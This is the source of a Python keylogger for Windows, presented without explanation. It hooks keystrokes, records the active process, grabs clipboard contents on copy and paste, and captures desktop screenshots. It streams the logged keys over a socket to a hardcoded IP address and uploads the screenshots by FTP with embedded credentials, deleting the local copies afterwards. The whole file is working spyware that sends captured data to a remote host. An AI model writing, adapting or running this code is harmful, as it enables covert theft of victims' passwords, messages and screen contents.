from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
import socket
import ftplib
import os
from datetime import datetime

 
user32 = windll.user32 
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
data=''
datime=''
target_host = "192.168.136.142"
target_port = 62
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

mes = ""
session = ftplib.FTP('192.168.136.142','person','cat')

def saveIt():
    
    global data
    global mes
    fp=open("temp2.txt","a")
    fp.write(mes)
    fp.close()
    data=''

def sendIt():
    global data
    global mes
    if len(mes) > 77:
        client.send(mes)
        mes = ""
   
def get_current_process():
    global mes
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)  
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
        
    data =  "\n[ %s - PID: %s]\n" % (executable.value, process_id)    
    print data
    mes += data
    saveIt()
    sendIt()
       
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    global mes
    global data
    global datime
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii < 127:
        data = chr(event.Ascii)
        print data
        mes += data
        print mes
        saveIt()
        sendIt()
             
    elif event.Ascii == 32:
        data = " "
        mes += data
        saveIt()
        sendIt()
    else:       
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            Timey()
            data = "([ctlr-v] - %s at %s)" % (pasted_value, datime)
            print data
            mes += data
            cap()
            saveIt()
            sendIt()            
        if event.Key == "C":
                    win32clipboard.OpenClipboard()
                    copied_value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    Timey()
                    data = "([ctlr-c] - %s at %s)" % (copied_value, datime)
                    print data
                    mes +=data
                    cap()
                    saveIt()
                    sendIt()
        else:
            print "[%s]" % event.Key
            data = "[%s]" % event.Key
            mes += data
            saveIt()
            sendIt()
    
    return True

def Timey():
    global datime
    datime = str(datetime.now())
      
def cap():
    global datime
    hdesktop = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    Timey()
    new_str = datime.replace(':', '-')
    new_strb = new_str
    location = 'c:\\0\\temp\\screenshot'
    location = location + new_str
    location = location + ".bmp"
    screenshot.SaveBitmapFile(mem_dc, location)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())    

    ##ftp the cap
    dog = "dog2.bmp"
    new_str2 = "screenshot"
    new_str2 += new_strb
    new_str2 += ".bmp"
    tempstr = "temp\\"
    tempstr += new_str2
    file = open(tempstr,'rb')                
    stor_str ="STOR "
    stor_str += new_str2
    session.storbinary(stor_str, file)     
    file.close()                            
    #session.quit()
    ##delete the file
    os.remove(tempstr)
#end
print "hfsi"
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
#session.quit()
